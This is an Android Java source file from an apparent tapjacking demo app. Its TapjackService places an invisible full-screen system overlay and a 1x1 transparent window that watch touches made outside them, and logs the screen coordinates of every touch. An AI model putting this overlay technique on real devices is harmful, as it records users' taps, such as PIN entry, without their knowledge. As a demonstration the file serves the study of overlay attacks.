package com.thz.tapjackingdemo;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.IBinder;
import android.util.Log;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;

public class TapjackService extends Service implements View.OnTouchListener {
    private View v = null;

    private WindowManager mgr = null;

    public TapjackService() {
    }

    @Override
    public void onCreate() {
        super.onCreate();



        v=new View(this);

        v.setOnTouchListener(this);

        mgr=(WindowManager)getSystemService(WINDOW_SERVICE);



        WindowManager.LayoutParams params

                =new WindowManager.LayoutParams(

                WindowManager.LayoutParams.MATCH_PARENT,

                WindowManager.LayoutParams.MATCH_PARENT,

                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,

                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,

                PixelFormat.TRANSPARENT);



        params.gravity=Gravity.FILL_HORIZONTAL|Gravity.FILL_VERTICAL;

        mgr.addView(v, params);

        WindowManager mWindowManager = (WindowManager) this.getSystemService(Context.WINDOW_SERVICE);

        LinearLayout mDummyView = new LinearLayout(this);

        LinearLayout.LayoutParams linearParams = new LinearLayout.LayoutParams(1, LinearLayout.LayoutParams.MATCH_PARENT);
        mDummyView.setLayoutParams(linearParams);
        mDummyView.setOnTouchListener(this);

        WindowManager.LayoutParams windowParams = new WindowManager.LayoutParams(
                1, /* width */
                1, /* height */
                WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                        WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSPARENT
        );
        windowParams.gravity = Gravity.LEFT | Gravity.TOP;
        mWindowManager.addView(mDummyView, windowParams);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        mgr.removeView(v);
        super.onDestroy();
    }

    @Override
    public boolean onTouch(View view, MotionEvent motionEvent) {
        Log.d("XT112233",

                String.valueOf(motionEvent.getX()) + ":" + String.valueOf(motionEvent.getY()));


        return false;
    }


}
